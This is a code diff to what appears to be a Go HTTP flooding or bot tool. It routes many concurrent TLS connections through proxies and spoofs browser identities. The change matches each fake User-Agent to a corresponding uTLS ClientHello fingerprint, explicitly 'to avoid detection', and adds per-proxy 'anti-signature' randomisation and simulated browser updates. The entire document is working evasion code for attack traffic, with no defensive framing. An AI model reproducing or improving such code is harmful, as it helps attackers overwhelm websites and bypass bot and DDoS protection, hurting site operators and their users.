@@ -110,6 +110,7 @@ type ProxyInfo struct {
 	LastUserAgent string // เก็บ User-Agent ล่าสุดเพื่อ consistency
 	RequestCount int64 // จำนวน request ที่ส่งไปแล้ว
 	ErrorCount int64   // จำนวน error ที่เกิดขึ้น
+	CurrentTLSFingerprint tls.ClientHelloID // Current TLS fingerprint to match User-Agent
 }
 
 // Generate random string for session IDs
@@ -154,7 +155,7 @@ func parseProxiesAdvanced(filename string) ([]*ProxyInfo, error) {
 				Auth:      "",
 				SessionID: fmt.Sprintf("%s:%s", hk, sessionValue),
 				// Anti-signature #69: แต่ละ proxy มี characteristics แตกต่างกัน
-				ProfileIndex: rand.Intn(6),  // 0-5 browser profiles (Chrome120,Chrome112,Chrome106,Firefox120,Firefox105,Safari)
+				ProfileIndex: rand.Intn(9),  // 0-8 browser profiles (9 total profiles with matched TLS fingerprints)
 				LangIndex: rand.Intn(5),     // 0-4 accept-language options
 				RateFactor: 0.5 + rand.Float64(), // 0.5x - 1.5x rate variation
 				ParamKey: []string{"v","t","_","cache"}[rand.Intn(4)], // Anti-Signature #37: Only standard params
@@ -174,7 +175,7 @@ func parseProxiesAdvanced(filename string) ([]*ProxyInfo, error) {
 				Auth:      base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s:%s", p[2], p[3]))),
 				SessionID: fmt.Sprintf("%s:%s", hk, sessionValue),
 				// Anti-signature #69: แต่ละ proxy มี characteristics แตกต่างกัน
-				ProfileIndex: rand.Intn(6),  // 0-5 browser profiles (Chrome120,Chrome112,Chrome106,Firefox120,Firefox105,Safari)
+				ProfileIndex: rand.Intn(9),  // 0-8 browser profiles (9 total profiles with matched TLS fingerprints)
 				LangIndex: rand.Intn(5), 
 				RateFactor: 0.5 + rand.Float64(),
 				ParamKey: []string{"v","t","_","cache"}[rand.Intn(4)], // Anti-Signature #37: Only standard params
@@ -238,26 +239,10 @@ func establishTls(hostname string, conn *net.Conn, proxyInfo *ProxyInfo) (tls.UC
 	// Dynamic TLS fingerprint selection เพื่อหลีกเลี่ยง uniform patterns
 	var clientHello tls.ClientHelloID
 	
-	// Anti-Signature #69: Diverse TLS fingerprint selection with available legitimate browser patterns
-	if proxyInfo != nil {
-		// Use available TLS fingerprints for better diversity
-		profileMod := proxyInfo.ProfileIndex % 6 // Use 6 available TLS fingerprints to match browser profiles
-		switch profileMod {
-		case 0:
-			clientHello = tls.HelloChrome_120
-		case 1:
-			clientHello = tls.HelloChrome_112 
-		case 2:
-			clientHello = tls.HelloChrome_106
-		case 3:
-			clientHello = tls.HelloFirefox_120
-		case 4:
-			clientHello = tls.HelloFirefox_105
-		case 5:
-			clientHello = tls.HelloSafari_16_0
-		default:
-			clientHello = tls.HelloChrome_120
-		}
+	// CRITICAL: Use TLS fingerprint that matches the User-Agent to avoid detection
+	if proxyInfo != nil && proxyInfo.CurrentTLSFingerprint.Str() != "" {
+		// Use the TLS fingerprint that matches the current User-Agent
+		clientHello = proxyInfo.CurrentTLSFingerprint
 		
 		// Anti-bot session evolution with natural browser update patterns
 		sessionMinutes := int(time.Since(proxyInfo.SessionStartTime).Minutes())
@@ -265,25 +250,33 @@ func establishTls(hostname string, conn *net.Conn, proxyInfo *ProxyInfo) (tls.UC
 		if sessionMinutes > 30 && sessionMinutes%45 == 0 {
 			// 3% chance every 45 minutes of "browser update" (more realistic)
 			if rand.Float32() < 0.03 {
-				// Natural browser upgrade paths using string comparison
-				currentFingerprintStr := fmt.Sprintf("%v", clientHello)
-				if strings.Contains(currentFingerprintStr, "Chrome_112") {
-					clientHello = tls.HelloChrome_120 // Chrome auto-update
-				} else if strings.Contains(currentFingerprintStr, "Firefox_105") {
-					clientHello = tls.HelloFirefox_120 // Firefox update
-				} else if strings.Contains(currentFingerprintStr, "Chrome_106") {
+				// Natural browser upgrade paths based on fingerprint string
+				currentFingerprintStr := clientHello.Str()
+				if strings.Contains(currentFingerprintStr, "Chrome 106") {
 					clientHello = tls.HelloChrome_112 // Incremental Chrome update
+					proxyInfo.CurrentTLSFingerprint = clientHello
+				} else if strings.Contains(currentFingerprintStr, "Chrome 112") {
+					clientHello = tls.HelloChrome_120 // Chrome auto-update
+					proxyInfo.CurrentTLSFingerprint = clientHello
+				} else if strings.Contains(currentFingerprintStr, "Firefox 105") {
+					clientHello = tls.HelloFirefox_120 // Firefox update
+					proxyInfo.CurrentTLSFingerprint = clientHello
 				}
 			}
 		}
 	} else {
-		// Fallback with available legitimate fingerprints
+		// Fallback with available legitimate fingerprints (should rarely happen)
 		legitimateFingerprints := []tls.ClientHelloID{
 			tls.HelloChrome_120, tls.HelloChrome_112, tls.HelloChrome_106,
 			tls.HelloFirefox_120, tls.HelloFirefox_105,
 			tls.HelloSafari_16_0,
 		}
 		clientHello = legitimateFingerprints[rand.Intn(len(legitimateFingerprints))]
+		
+		// Store for consistency if proxyInfo exists
+		if proxyInfo != nil {
+			proxyInfo.CurrentTLSFingerprint = clientHello
+		}
 	}
 	
 	wConn := tls.UClient(*conn, conf, clientHello, false, false)
@@ -371,6 +364,7 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 	}
 	
 		// Anti-Signature #69: Enhanced browser profiles with diverse legitimate signatures
+		// CRITICAL: User-Agent MUST match available TLS fingerprints to avoid detection
 		browserProfiles := []struct {
 			userAgent       string
 			secChUA         string
@@ -381,8 +375,9 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 			acceptEncoding  string
 			acceptValue     string
 			platform        string
+			tlsFingerprint  tls.ClientHelloID // Match TLS fingerprint to User-Agent
 		}{
-			// Chrome 120 Windows (latest)
+			// Chrome 120 Windows - matches HelloChrome_120
 			{
 				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
@@ -390,8 +385,9 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 				"gzip, deflate, br, zstd",
 				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 				"Windows NT 10.0; Win64; x64",
+				tls.HelloChrome_120,
 			},
-			// Chrome 120 macOS (avoid single OS pattern)
+			// Chrome 120 macOS - matches HelloChrome_120
 			{
 				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
@@ -399,59 +395,56 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 				"gzip, deflate, br, zstd",
 				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 				"Macintosh; Intel Mac OS X 10_15_7",
+				tls.HelloChrome_120,
 			},
-			// Chrome 119 (still common in real world)
+			// Chrome 112 Windows - matches HelloChrome_112
 			{
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-				"\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+				"\"Google Chrome\";v=\"112\", \"Chromium\";v=\"112\", \"Not=A?Brand\";v=\"24\"",
 				"\"Windows\"", false, false, false,
-				"gzip, deflate, br, zstd",
+				"gzip, deflate, br",
 				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 				"Windows NT 10.0; Win64; x64",
+				tls.HelloChrome_112,
 			},
-			// Edge (avoid pure Chrome patterns)
+			// Chrome 106 macOS - matches HelloChrome_106
 			{
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"",
-				"\"Windows\"", false, false, true,
-				"gzip, deflate, br, zstd",
-				"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-				"Windows NT 10.0; Win64; x64",
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
+				"\"Chromium\";v=\"106\", \"Google Chrome\";v=\"106\", \"Not;A=Brand\";v=\"99\"",
+				"\"macOS\"", false, false, false,
+				"gzip, deflate, br",
+				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+				"Macintosh; Intel Mac OS X 10_15_7",
+				tls.HelloChrome_106,
 			},
-			// Firefox 121 (latest)
+			// Firefox 120 Windows - matches HelloFirefox_120
 			{
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
 				"", "", true, false, false,
 				"gzip, deflate, br",
 				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
 				"Windows NT 10.0; Win64; x64",
+				tls.HelloFirefox_120,
 			},
-			// Firefox macOS (diversity)
+			// Firefox 105 macOS - matches HelloFirefox_105
 			{
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0",
 				"", "", true, false, false,
 				"gzip, deflate, br",
 				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
 				"Macintosh; Intel Mac OS X 10.15",
+				tls.HelloFirefox_105,
 			},
-			// Safari 17.0 (latest)
+			// Safari 16.0 - matches HelloSafari_16_0
 			{
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
 				"", "\"macOS\"", false, true, false,
 				"gzip, deflate, br",
 				"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 				"Macintosh; Intel Mac OS X 10_15_7",
+				tls.HelloSafari_16_0,
 			},
-			// Mobile Chrome (add mobile diversity)
-			{
-				"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
-				"\"Android\"", false, false, false,
-				"gzip, deflate, br, zstd",
-				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-				"Linux; Android 10",
-			},
-			// Chrome Linux (avoid Windows-only pattern)
+			// Chrome 120 Linux - matches HelloChrome_120
 			{
 				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
@@ -459,6 +452,17 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 				"gzip, deflate, br, zstd",
 				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 				"X11; Linux x86_64",
+				tls.HelloChrome_120,
+			},
+			// Chrome 112 Android Mobile - matches HelloChrome_112
+			{
+				"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+				"\"Google Chrome\";v=\"112\", \"Chromium\";v=\"112\", \"Not=A?Brand\";v=\"24\"",
+				"\"Android\"", false, false, false,
+				"gzip, deflate, br",
+				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+				"Linux; Android 10",
+				tls.HelloChrome_112,
 			},
 		}
 	
@@ -574,6 +578,8 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 				// First request - บันทึก User-Agent ไว้
 				proxyInfo.LastUserAgent = browserProfile.userAgent
 			}
+			// CRITICAL: Store TLS fingerprint to ensure consistency with User-Agent
+			proxyInfo.CurrentTLSFingerprint = browserProfile.tlsFingerprint
 		}
 		
 		// Anti-Signature #69: More realistic sec-fetch headers with proper navigation flows
@@ -1633,6 +1639,9 @@ func main() {
 			Addr:      proxyIP,
 			Auth:      "",
 			SessionID: fmt.Sprintf("%s:%s", genRandStr(5), genRandStr(8)),
+			ProfileIndex: rand.Intn(9), // 0-8 to match 9 browser profiles
+			LangIndex: rand.Intn(13), // 0-12 to match 13 accept-language options
+			SessionStartTime: time.Now(),
 		}
 		for i := 0; i < conns; i++ {
 			go startRawTLS(parsed, singleProxy)
